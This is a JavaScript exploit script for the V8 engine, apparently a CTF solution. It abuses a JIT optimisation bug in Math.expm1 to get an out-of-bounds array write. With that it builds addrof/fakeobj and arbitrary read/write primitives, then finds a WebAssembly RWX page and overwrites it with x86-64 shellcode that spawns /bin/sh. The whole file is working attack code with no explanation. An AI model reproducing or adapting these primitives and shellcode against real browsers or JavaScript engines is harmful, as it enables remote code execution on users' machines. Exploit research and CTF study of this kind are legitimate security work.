var FormatBuffer = function(){
    this.buffer = new ArrayBuffer(8);
    this.u8 = new Uint8Array(this.buffer);
    this.u32 = new Uint32Array(this.buffer);
    this.f64 = new Float64Array(this.buffer);
    this.BASE = 0x100000000;
};
let fbuf = new FormatBuffer();
var i2f = function(i){
    fbuf.u32[0] = i%fbuf.BASE;
    fbuf.u32[1] = i/fbuf.BASE;
    return fbuf.f64[0];
};

var f2i = function(f){
    fbuf.f64[0] = f;
    return fbuf.u32[0] + fbuf.BASE*fbuf.u32[1]; 
};

var hex = function(x){
    if (x < 0)
        return `-${hex(-x)}`;
    return `0x${x.toString(16)}`;
};

var oob_arr = undefined;

function foo(x) {

    let o = {mz: -0};
    let i = Object.is(Math.expm1(x), o.mz); // i = 0
    i *= 14; // Feedback i = 0; slot 14 is the b.length

    let a = [0.1, 0.2, 0.3, 0.4, 0.5];
    let b = [1.1, 1.2, 1.3, 1.4];
    oob_arr = b;
    a[i] = i2f(0x111100000000); // Modify length of oob_arr 

    return a[i];
}

foo(0);
// JIT
for(let i=0; i<100000; i++)
    foo("0");

print(hex(f2i(foo(-0)))); // trigger vuln here

var victim = {prop:0xdeadbeef};

function addrof(obj){

    victim.prop = obj;

    return f2i(oob_arr[0x1f]);
}

function fakeobj(addr){

    oob_arr[0x1f] = i2f(addr);

    return victim.prop;
}

var arb_buf = new ArrayBuffer(0x100);

print("[*] oob_arr address : "+hex(addrof(oob_arr)));
print("[*] victim address : "+hex(addrof(victim)));
print("[*] arb_buf address : "+hex(addrof(arb_buf)));

function read64(addr){

    oob_arr[0x2a] = i2f(addr);
    let buf_f64 = new Float64Array(arb_buf);

    return f2i(buf_f64[0]);
}

function arb_write(addr, content){

    oob_arr[0x2a] = i2f(addr);
    if(typeof content == "number"){
        let buf_f64 = new Float64Array(arb_buf);
        buf_f64[0] = i2f(content);
    }else if(typeof content == "string"){
        let buf_u8 = new Uint8Array(arb_buf);
        for(let i=0, len=content.length; i<len; i++){
            buf_u8[i] = content[i].charCodeAt();
        }
    }

}

let read_addr = addrof(victim)-1+8*3;
print("[*] "+hex(read_addr)+" : "+hex(read64(read_addr)));


var pwn = {

    getRWXMem : function(){

        let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        let wasmModule = new WebAssembly.Module(wasmCode);
        let wasmInstance = new WebAssembly.Instance(wasmModule);
        
        let shellcodeFunc = wasmInstance.exports.main;
        
        let shellcodeAddr = addrof(shellcodeFunc);
        shellcodeAddr = read64(shellcodeAddr-1+8*3);
        shellcodeAddr = read64(shellcodeAddr-1+8*1);
        shellcodeAddr = read64(shellcodeAddr-1+8*2);
        shellcodeAddr = read64(shellcodeAddr-1+8*0x1d);

        return [shellcodeFunc, shellcodeAddr];
    },
    start : function(){

        let shellcodeObj = this.getRWXMem();
        let shellcodeAddr = shellcodeObj[1];
        let shellcodeFunc = shellcodeObj[0];

        let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";
        print("[*] Get RWX memory address : "+hex(shellcodeAddr));
        print("[*] Injecting shellcode...");
        arb_write(shellcodeAddr, shellcode);
        print("[*] Remote code execute...");
        shellcodeFunc();

    }

};

pwn.start();